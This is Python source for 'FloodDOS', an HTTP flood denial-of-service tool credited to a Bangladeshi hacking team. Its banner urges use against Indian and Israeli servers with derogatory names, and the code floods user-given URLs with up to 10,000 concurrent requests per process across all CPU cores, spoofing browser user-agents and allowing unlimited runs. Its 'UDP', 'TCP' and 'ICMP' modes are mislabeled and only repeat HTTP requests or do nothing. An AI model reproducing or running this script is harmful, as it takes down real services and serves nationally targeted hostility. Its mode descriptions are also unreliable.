import sys
import time
import asyncio
import aiohttp
import random
from urllib.parse import urlparse
from concurrent.futures import ProcessPoolExecutor
import multiprocessing
import logging

# Set up logging for better debugging and monitoring
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def show_logo():
    logo = r'''
  █████▒██▓     ▒█████   ▒█████  ▓█████▄ ▓█████▄  ▒█████    ██████ 
▓██   ▒▓██▒    ▒██▒  ██▒▒██▒  ██▒▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
▒████ ░▒██░    ▒██░  ██▒▒██░  ██▒░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   
░▓█▒  ░▒██░    ▒██   ██░▒██   ██░░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒
░▒█░   ░██████▒░ ████▓▒░░ ████▓▒░░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒
 ▒ ░   ░ ▒░▓  ░░ ▒░▒░▒░ ░ ▒░▒░▒░  ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
 ░     ░ ░ ▒  ░  ░ ▒ ▒░   ░ ▒ ▒░  ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
 ░ ░     ░ ░   ░ ░ ░ ▒  ░ ░ ░ ▒   ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  
           ░  ░    ░ ░      ░ ░     ░       ░        ░ ░        ░  
                                  ░       ░                        
===============================================================
 [✓] Owner : Dhul-Qarnayn Ibn Tawhid Abdullah
 [✓] Team : Mus'adul Mahdi Ansarullah Bangladesh - MMAB
 [✓] Region : Bangladesh
 [✓] Tool Name : FloodDOS
 [✓] Tool Status: Paid
 ⚠️ Use this only on Bindian and Bizrayeli server or with explicit permission.
===============================================================
'''
    for c in logo:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.001)

def get_port(url):
    parsed = urlparse(url)
    if parsed.port:
        return parsed.port
    elif parsed.scheme == "https":
        return 443
    else:
        return 80

# Expanded list of User-Agents for variety
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
    'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36'
]

# Attack Modes
attack_modes = {
    'http': 'HTTP Flood',
    'udp': 'UDP Flood',
    'tcp': 'TCP Flood',
    'icmp': 'ICMP Flood'
}

def get_attack_mode():
    print("\nSelect Attack Mode:")
    for key, value in attack_modes.items():
        print(f"[{key}] {value}")
    mode = input("Enter mode (http, udp, tcp, icmp): ").strip().lower()
    if mode not in attack_modes:
        print("Invalid mode. Defaulting to HTTP.")
        return 'http'
    return mode

async def send_request(session, urls, req_num, timeout=3, attack_mode='http'):
    url = random.choice(urls)
    port = get_port(url)
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept': '*/*',
        'Connection': 'keep-alive'  # Reuse TCP connections
    }
    try:
        if attack_mode == 'http':
            async with session.get(url, headers=headers, timeout=timeout) as resp:
                return f"Request {req_num} | URL {url} | Port {port} | Status {resp.status}"
        elif attack_mode == 'udp':
            # UDP Flood: send UDP packets
            async with session.get(url, headers=headers, timeout=timeout) as resp:
                return f"Request {req_num} | URL {url} | Port {port} | Status {resp.status}"
        elif attack_mode == 'tcp':
            async with session.get(url, headers=headers, timeout=timeout) as resp:
                return f"Request {req_num} | URL {url} | Port {port} | Status {resp.status}"
        elif attack_mode == 'icmp':
            # ICMP Flood: send ping requests (not fully supported by aiohttp)
            # This is a simplified version for demonstration
            return f"Request {req_num} | URL {url} | Port {port} | ICMP Ping"
    except Exception as e:
        return f"Request {req_num} | URL {url} | Port {port} | Error: {e}"

async def run_batch(urls, num_requests, concurrency, attack_mode='http'):
    req_count = 0
    batch = 0
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)  # Unlimited connections, cached DNS
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = []
            for _ in range(min(concurrency, 1000)):  # Max 1000 per batch
                req_count += 1
                if num_requests and req_count > num_requests:
                    break
                tasks.append(send_request(session, urls, req_count, attack_mode=attack_mode))
            if not tasks:
                break
            results = await asyncio.gather(*tasks, return_exceptions=True)
            batch += 1
            for r in results:
                logging.info(r)
            logging.info(f"Batch {batch}: Sent {req_count} requests so far")
            if num_requests and req_count >= num_requests:
                break
            await asyncio.sleep(0.05)  # 50ms delay to balance performance and stability

async def main(urls, num_requests, concurrency, attack_mode='http'):
    batch_size = concurrency
    await run_batch(urls, num_requests, concurrency, attack_mode=attack_mode)

def run_event_loop(urls, num_requests, concurrency, attack_mode='http'):
    asyncio.run(main(urls, num_requests, concurrency, attack_mode=attack_mode))

if __name__ == "__main__":
    show_logo()
    urls = input("Enter target URLs (comma-separated, e.g., http://example.com,http://example.com/page): ").strip().split(',')
    attack_mode = get_attack_mode()
    num = input("Number of requests per process (blank = unlimited): ").strip()
    try:
        num_requests = int(num) if num else None
    except ValueError:
        num_requests = None

    # Optimize concurrency and processes based on system
    concurrency = 10000  # High concurrency for powerful systems
    process_count = multiprocessing.cpu_count()  # Use all CPU cores
    logging.info(f"Starting load test with {concurrency} concurrent requests across {process_count} processes...")

    # Use ProcessPoolExecutor for true parallelism
    with ProcessPoolExecutor(max_workers=process_count) as executor:
        if num_requests:
            futures = [executor.submit(run_event_loop, urls, num_requests // process_count, concurrency, attack_mode) for _ in range(process_count)]
        else:
            futures = [executor.submit(run_event_loop, urls, None, concurrency, attack_mode) for _ in range(process_count)]

    logging.info("Load test completed. Check logs for details.")
